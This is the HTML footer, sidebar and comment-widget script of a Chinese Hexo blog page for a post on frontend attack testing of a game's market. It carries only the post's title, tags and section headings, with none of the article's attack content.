+</div></article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2026/04/01/69cd1de744d33.png" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2026/04/01/69cd1de744d33.png" title="头像" alt="头像"></a><div class="post-copyright__author_name">LeonardoFox</div><div class="post-copyright__author_desc">带你探索科技的奥秘</div></div><div class="post-copyright__post__info"><span class="post-copyright__original" title="该文章为原创文章，注意版权协议">原创</span><span class="post-copyright-title"><span onclick="rm.copyPageUrl('http://leonardo346.github.io/2026/03/02/gongfangzhengzhu/')">SAR Pearl Market 前端逆向攻击测试</span></span></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://leonardo346.github.io" target="_blank">纳多狐狐的实验室</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>安全研究<span class="tagsPageCount">1</span></a><a class="post-meta__box__tags" href="/tags/%E5%89%8D%E7%AB%AF%E9%80%86%E5%90%91/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>前端逆向<span class="tagsPageCount">1</span></a><a class="post-meta__box__tags" href="/tags/CTF/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>CTF<span class="tagsPageCount">1</span></a><a class="post-meta__box__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>渗透测试<span class="tagsPageCount">1</span></a></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2026/05/12/6822a1b3c4d5e.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2026/02/18/amdrightmenu/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2026/04/01/69cd1de469f15.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">AMD显卡右键菜单太长？一键精简教程（附注册表脚本）</div></div></a></div><div class="next-post pull-right"><a href="/2026/03/03/26-3update/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2026/04/07/69d48f0132691.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">26.3Update</div></div></a></div></nav><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)" style="display: none">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2026/04/01/69cd1de744d33.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/"><h1 class="author-info__name">LeonardoFox</h1><div class="author-info__desc">带你探索科技的奥秘</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/LeonardoFox346" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/523509650" target="_blank" title="BiliBili"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">博客正在迁移中...部分页面无法打开为正常现象! 文章页面请切换到深色模式查看,浅色模式无法正常显示文字!</div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2026/04/07/69d4869076eb2.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5%EF%BC%9A%E4%BF%A1%E6%81%AF%E4%BE%A6%E5%AF%9F"><span class="toc-number">1.</span> <span class="toc-text">第一阶段：信息侦察</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%EF%BC%9A%E5%89%8D%E7%AB%AF%E7%AF%A1%E6%94%B9%E5%B0%9D%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">第二阶段：前端篡改尝试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%98%B6%E6%AE%B5%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82%E6%8B%A6%E6%88%AA"><span class="toc-number">3.</span> <span class="toc-text">第三阶段：网络层拦截</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E9%98%B6%E6%AE%B5%EF%BC%9A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">第四阶段：逆向工程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E9%98%B6%E6%AE%B5%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">第五阶段：漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%BB%93%E6%9E%9C%E4%B8%8E%E9%AA%8C%E8%AF%81"><span class="toc-number">6.</span> <span class="toc-text">攻击结果与验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">7.</span> <span class="toc-text">漏洞分析与修复建议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9F%A9%E9%98%B5"><span class="toc-number">7.1.</span> <span class="toc-text">漏洞矩阵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">7.2.</span> <span class="toc-text">修复建议</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/05/12/python_zen/" title="Python：藏在&quot;import this&quot;里的编程哲学"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2026/05/12/6822a1b3c4d5e.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python：藏在&quot;import this&quot;里的编程哲学"/></a><div class="content"><a class="title" href="/2026/05/12/python_zen/" title="Python：藏在&quot;import this&quot;里的编程哲学">Python：藏在&quot;import this&quot;里的编程哲学</a><time datetime="2026-05-12T11:15:00.000Z" title="发表于 2026-05-12 19:15:00">2026-05-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/05/12/260512update/" title="站点更新"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2026/05/12/6a0307e7127a5.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="站点更新"/></a><div class="content"><a class="title" href="/2026/05/12/260512update/" title="站点更新">站点更新</a><time datetime="2026-05-12T10:30:00.000Z" title="发表于 2026-05-12 18:30:00">2026-05-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/05/12/python_intro_tutorial/" title="欢迎来到Python的世界!"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2026/05/12/6a02f10122d65.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="欢迎来到Python的世界!"/></a><div class="content"><a class="title" href="/2026/05/12/python_intro_tutorial/" title="欢迎来到Python的世界!">欢迎来到Python的世界!</a><time datetime="2026-05-12T02:00:00.000Z" title="发表于 2026-05-12 10:00:00">2026-05-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/05/11/C-Notes/scanfbucong/" title="关于scanf"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2026/05/11/6a01fadb6fb3e.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于scanf"/></a><div class="content"><a class="title" href="/2026/05/11/C-Notes/scanfbucong/" title="关于scanf">关于scanf</a><time datetime="2026-05-11T15:30:00.000Z" title="发表于 2026-05-11 23:30:00">2026-05-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/05/11/C-Notes/zhanweifuyushujuleixingzongjie/" title="你好为什么变成了烫烫烫"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2026/05/11/6a01fbafe2695.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="你好为什么变成了烫烫烫"/></a><div class="content"><a class="title" href="/2026/05/11/C-Notes/zhanweifuyushujuleixingzongjie/" title="你好为什么变成了烫烫烫">你好为什么变成了烫烫烫</a><time datetime="2026-05-11T15:30:00.000Z" title="发表于 2026-05-11 23:30:00">2026-05-11</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="footer_custom_text"><div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 30px; padding: 30px 20px; max-width: 800px; margin: 0 auto;"><div style="text-align: left;"><h4 style="margin: 0 0 12px 0; color: var(--color-text); font-size: 16px; border-bottom: 2px solid #2196F3; padding-bottom: 5px; display: inline-block;"><i class="fa-solid fa-circle-info" style="color: #2196F3;"></i> 关于</h4><p style="margin: 0; font-size: 13px; color: var(--color-text); opacity: 0.8; line-height: 1.6;">使用 <a href="https://hexo.io" target="_blank" style="color: #2196F3; text-decoration: none;">Hexo</a> 框架构建<br>魔改安知鱼主题美化</p></div><div style="text-align: center;"><h4 style="margin: 0 0 12px 0; color: var(--color-text); font-size: 16px; border-bottom: 2px solid #FF9800; padding-bottom: 5px; display: inline-block;"><i class="fa-solid fa-copyright" style="color: #FF9800;"></i> 版权</h4><p style="margin: 0; font-size: 13px; color: var(--color-text); opacity: 0.8; line-height: 1.6;">© 2020-2026<br><strong>LeonardoFox346</strong></p></div><div style="text-align: right;"><h4 style="margin: 0 0 12px 0; color: var(--color-text); font-size: 16px; border-bottom: 2px solid #4CAF50; padding-bottom: 5px; display: inline-block;"><i class="fa-solid fa-file-contract" style="color: #4CAF50;"></i> 协议</h4><p style="margin: 0; font-size: 13px; color: var(--color-text); opacity: 0.8; line-height: 1.6;"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" style="color: #4CAF50; text-decoration: none;">CC BY-NC-SA 4.0</a><br>署名-非商业-共享</p></div></div><div style="text-align: center; padding: 15px 20px; max-width: 800px; margin: 0 auto; border-top: 1px solid rgba(128,128,128,0.2);"><p style="margin: 0; font-size: 12px; color: #ff69b4; line-height: 1.6;"><i class="fa-solid fa-shield-halved" style="color: #ff69b4;"></i> <a href="https://icp.gov.moe/?keyword=leonardofox346.github.io" target="_blank" style="color: #ff69b4; text-decoration: none;">萌ICP备20250346号</a></p></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">39</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">2</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 全部文章</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/c-notes/"><i class="anzhiyufont anzhiyu-icon-code faa-tada" style="font-size: 0.9em;"></i><span> C语言学习</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于我</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/AMD%E6%98%BE%E5%8D%A1/" style="font-size: 0.88rem;">AMD显卡<sup>1</sup></a><a href="/tags/ArmouryCrate/" style="font-size: 0.88rem;">ArmouryCrate<sup>1</sup></a><a href="/tags/CTF/" style="font-size: 0.88rem;">CTF<sup>1</sup></a><a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 0.88rem;">C语言<sup>2</sup></a><a href="/tags/Python/" style="font-size: 0.88rem;">Python<sup>2</sup></a><a href="/tags/Python%E4%B9%8B%E7%A6%85/" style="font-size: 0.88rem;">Python之禅<sup>1</sup></a><a href="/tags/Steam/" style="font-size: 0.88rem;">Steam<sup>1</sup></a><a href="/tags/Super-Animal-Royale/" style="font-size: 0.88rem;">Super Animal Royale<sup>1</sup></a><a href="/tags/Windows/" style="font-size: 0.88rem;">Windows<sup>1</sup></a><a href="/tags/web/" style="font-size: 0.88rem;">web<sup>1</sup></a><a href="/tags/%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/" style="font-size: 0.88rem;">入门教程<sup>1</sup></a><a href="/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" style="font-size: 0.88rem;">内存管理<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF%E9%80%86%E5%90%91/" style="font-size: 0.88rem;">前端逆向<sup>1</sup></a><a href="/tags/%E5%8D%8E%E7%A1%95ROG/" style="font-size: 0.88rem;">华硕ROG<sup>1</sup></a><a href="/tags/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95/" style="font-size: 0.88rem;">右键菜单<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/" style="font-size: 0.88rem;">后端开发<sup>1</sup></a><a href="/tags/%E5%A4%A7%E9%80%83%E6%9D%80/" style="font-size: 0.88rem;">大逃杀<sup>1</sup></a><a href="/tags/%E5%A4%A9%E9%80%89/" style="font-size: 0.88rem;">天选<sup>1</sup></a><a href="/tags/%E5%A5%A5%E5%88%9B%E4%B8%AD%E5%BF%83/" style="font-size: 0.88rem;">奥创中心<sup>1</sup></a><a href="/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" style="font-size: 0.88rem;">安全研究<sup>1</sup></a><a href="/tags/%E5%B0%8F%E5%8A%A8%E7%89%A9%E4%B9%8B%E6%98%9F/" style="font-size: 0.88rem;">小动物之星<sup>1</sup></a><a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 0.88rem;">开发<sup>1</sup></a><a href="/tags/%E6%81%90%E6%80%96%E6%B8%B8%E6%88%8F/" style="font-size: 0.88rem;">恐怖游戏<sup>1</sup></a><a href="/tags/%E6%8A%98%E8%85%BE/" style="font-size: 0.88rem;">折腾<sup>1</sup></a><a href="/tags/%E6%94%BB%E7%95%A5/" style="font-size: 0.88rem;">攻略<sup>1</sup></a><a href="/tags/%E6%95%99%E7%A8%8B/" style="font-size: 0.88rem;">教程<sup>2</sup></a><a href="/tags/%E6%97%A5%E5%B8%B8/" style="font-size: 0.88rem;">日常<sup>1</sup></a><a href="/tags/%E6%9E%81%E5%AE%A2/" style="font-size: 0.88rem;">极客<sup>1</sup></a><a href="/tags/%E6%B3%A8%E5%86%8C%E8%A1%A8/" style="font-size: 0.88rem;">注册表<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">渗透测试<sup>1</sup></a><a href="/tags/%E6%B8%B8%E6%88%8F/" style="font-size: 0.88rem;">游戏<sup>1</sup></a><a href="/tags/%E7%89%88%E6%9C%AC%E5%9B%9E%E9%80%80/" style="font-size: 0.88rem;">版本回退<sup>1</sup></a><a href="/tags/%E7%8E%A9%E6%9C%BA%E6%95%99%E7%A8%8B/" style="font-size: 0.88rem;">玩机教程<sup>1</sup></a><a href="/tags/%E7%AB%99%E5%8A%A1/" style="font-size: 0.88rem;">站务<sup>1</sup></a><a href="/tags/%E7%B3%BB%E7%BB%9F%E4%BC%98%E5%8C%96/" style="font-size: 0.88rem;">系统优化<sup>1</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E5%85%A5%E9%97%A8/" style="font-size: 0.88rem;">编程入门<sup>1</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E5%93%B2%E5%AD%A6/" style="font-size: 0.88rem;">编程哲学<sup>1</sup></a><a href="/tags/%E8%81%94%E6%9C%BA%E6%B8%B8%E6%88%8F/" style="font-size: 0.88rem;">联机游戏<sup>1</sup></a><a href="/tags/%E8%A7%86%E8%A7%89%E4%BF%AE%E5%A4%8D/" style="font-size: 0.88rem;">视觉修复<sup>1</sup></a></div></div></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="13981921635" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://music.163.com/playlist?id=13981921635&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@6.1.6/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><script>(()=>{
+  const getGiscusTheme = theme => {
+    return theme === 'dark' ? 'dark_high_contrast' : 'light_high_contrast'
+  }
+
+  const loadGiscus = () => {
+    const config = Object.assign({
+      src: 'https://giscus.app/client.js',
+      'data-repo': 'LeonardoFox346/HomePinglun',
+      'data-repo-id': 'R_kgDOR8zBYQ',
+      'data-category-id': 'DIC_kwDOR8zBYc4C6Wuj',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true
+    },{"data-lang":"zh-CN","data-mapping":"pathname","data-category":"Announcements","data-input-position":"bottom"})
+
+    const ele = document.createElement('script')
+    for (let key in config) {
+      ele.setAttribute(key, config[key])
+    }
+    document.getElementById('giscus-wrap').appendChild(ele)
+  }
+
+  const changeGiscusTheme = theme => {
+    const sendMessage = message => {
+      const iframe = document.querySelector('iframe.giscus-frame')
+      if (!iframe) return
+      iframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app')
+    }
+
+    sendMessage({
+      setConfig: {
+        theme: getGiscusTheme(theme)
+      }
+    });
+  }
+
+  anzhiyu.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) anzhiyu.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
